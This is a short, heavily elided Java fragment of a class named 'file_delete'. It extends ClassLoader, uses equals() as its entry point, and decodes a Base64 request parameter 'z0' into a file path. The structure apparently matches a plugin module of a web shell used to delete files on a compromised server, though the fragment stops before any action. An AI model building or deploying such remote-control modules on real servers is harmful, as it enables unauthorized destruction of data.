...
public class file_delete extends ClassLoader
{
    public file_delete(ClassLoader objParent) { super(objParent); }
    public file_delete() { super(file_delete.class.getClassLoader()); }
    ...
    public boolean equals(Object objParam)
    {
        ...
        try
        {
            ...
            String szEntry = new String(Base64.getDecoder().decode(mapParams.get("z0")), StandardCharsets.UTF_8).trim();
            File fileTarget = new File(szEntry);
